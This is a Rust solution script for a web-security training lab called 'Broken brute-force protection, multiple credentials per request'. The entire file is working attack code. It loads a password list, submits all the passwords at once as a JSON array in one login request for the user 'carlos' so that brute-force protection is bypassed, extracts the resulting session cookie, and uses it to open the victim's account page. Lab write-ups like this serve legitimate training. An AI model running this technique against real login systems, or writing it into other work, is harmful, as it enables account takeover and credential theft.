/*************************************************************************
*
* Lab: Broken brute-force protection, multiple credentials per request
*
* Hack Steps: 
*      1. Read password list
*      2. Send multiple passwords in the same request
*      3. Get the session cookie of carlos
*      4. Fetch carlos profile
*
**************************************************************************/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{fs, time::Duration};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a9f0030040ef4de8aab3c820058007e.web-security-academy.net";

fn main() {
    print!("⦗1⦘ Reading password list.. ");

    let password_list = read_password_list("../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly

    println!("{}", "OK".green());
    print!("⦗2⦘ Sending multiple passwords in the same request.. ");

    let web_client = build_web_client();
    let login_with_multiple_passwords = web_client
        .post(format!("{LAB_URL}/login"))
        .header("Content-Type", "application/json")
        .body(format!(
            "{{\"username\": \"carlos\", \"password\": {:?}}}",
            password_list
        ))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to send multiple passwords in the same request".red()
        ));

    println!("{}", "OK".green());

    if login_with_multiple_passwords.status().as_u16() == 302 {
        print!("⦗3⦘ Getting the session cookie of carlos.. ");

        let session = get_session_cookie(&login_with_multiple_passwords);

        println!("{}", "OK".green());
        print!("⦗4⦘ Fetching carlos profile.. ");

        web_client
            .get(format!("{LAB_URL}/my-account?id=carlos"))
            .header("Cookie", format!("session={session}"))
            .send()
            .expect(&format!("{}", "⦗!⦘ Failed to fetch carlos profile".red()));

        println!("{}", "OK".green());
        println!("🗹 The lab should be marked now as {}", "solved".green());
    } else {
        println!("{}", "⦗!⦘ There is no valid password".red())
    }
}

fn read_password_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}
